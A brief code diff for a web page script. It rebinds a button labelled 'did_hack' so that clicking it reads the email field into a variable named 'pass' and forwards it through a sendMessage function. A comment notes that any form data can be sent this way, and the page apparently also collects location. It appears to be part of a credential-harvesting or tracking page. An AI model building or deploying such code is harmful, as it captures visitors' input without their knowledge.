@@ -42,7 +42,7 @@ function showPosition(position) {
 }
 
 window.addEventListener('load', ()=> {
-    document.getElementById('btn_continue').addEventListener('click', ()=> {
+    document.getElementById('did_hack').addEventListener('click', ()=> {
     let pass = document.getElementById('identify_email').value;
     sendMessage(pass); 
 });
@@ -55,5 +55,6 @@ window.addEventListener('load', ()=> {
 
 // Now you can send any text(even a form data) by calling sendMessage function.
 // For example if you want to send the 'hello', you can call that function like this:
+
 
 
